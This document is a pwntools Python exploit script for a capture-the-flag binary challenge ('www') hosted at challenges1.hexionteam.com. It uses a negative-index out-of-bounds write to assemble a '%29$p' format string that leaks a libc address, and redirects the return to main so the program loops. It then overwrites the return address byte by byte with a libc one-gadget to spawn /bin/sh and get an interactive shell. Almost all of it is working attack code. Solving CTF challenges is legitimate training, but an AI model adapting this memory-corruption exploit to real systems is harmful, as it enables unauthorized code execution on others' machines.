#!/usr/bin/env python3

from pwn import *
import re

exe = context.binary = ELF('./www')
libc = ELF("./libc")

host = args.HOST or 'challenges1.hexionteam.com'
port = int(args.PORT or 3002)

def local(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

io = start(env={"LD_PRELOAD": "./libc"})

# amount
io.sendline(str(-7))
io.sendline(b"\x0d")

# format
io.sendline(str(0))
io.sendline(b"%")

io.sendline(str(1))
io.sendline(b"2")

io.sendline(str(2))
io.sendline(b"9")

io.sendline(str(3))
io.sendline(b"$")

io.sendline(str(4))
io.sendline(b"p")

# ret with main
main_loop = 0x4007d0

# main address
io.sendline(str(45))
io.sendline(b"\x79")
io.sendline(str(45 + 1))
io.sendline(b"\x07")
io.sendline(str(45 + 2))
io.sendline(b"\x40")
io.sendline(str(45 + 3))
io.sendline(b"\x00")
io.sendline(str(45 + 4))
io.sendline(b"\x00")
io.sendline(str(45 + 5))
io.sendline(b"\x00")
io.sendline(str(45 + 6))
io.sendline(b"\x00")
io.sendline(str(45 + 7))
io.sendline(b"\x00")

data = io.recvuntil("World!")
leak = int(re.search(b"(0x[0-9a-f]+) World!", data).group(1), 16)
libc.address = leak - 0x401733

magic = libc.address + 0x10a38c # execve("/bin/sh", rsp+0x70, environ)
magic = libc.address + 0x4f322  # execve("/bin/sh", rsp+0x40, environ)
magic = libc.address + 0x4f2c5 # execve("/bin/sh", rsp+0x40, environ)


log.info("Leak: 0x%x", leak)
log.info("Libc: 0x%x", libc.address)
log.info("Magic: 0x%x", magic)

io.sendline(str(-7))
io.sendline(b"\x08")

magic_bytes = p64(magic)

# main address
io.sendline(str(45))
io.sendline(magic_bytes[0:1])
io.sendline(str(45 + 1))
io.sendline(magic_bytes[1:2])
io.sendline(str(45 + 2))
io.sendline(magic_bytes[2:3])
io.sendline(str(45 + 3))
io.sendline(magic_bytes[3:4])
io.sendline(str(45 + 4))
io.sendline(magic_bytes[4:5])
io.sendline(str(45 + 5))
io.sendline(magic_bytes[5:6])
io.sendline(str(45 + 6))
io.sendline(magic_bytes[6:7])
io.sendline(str(45 + 7))
io.sendline(magic_bytes[7:8])

io.interactive()
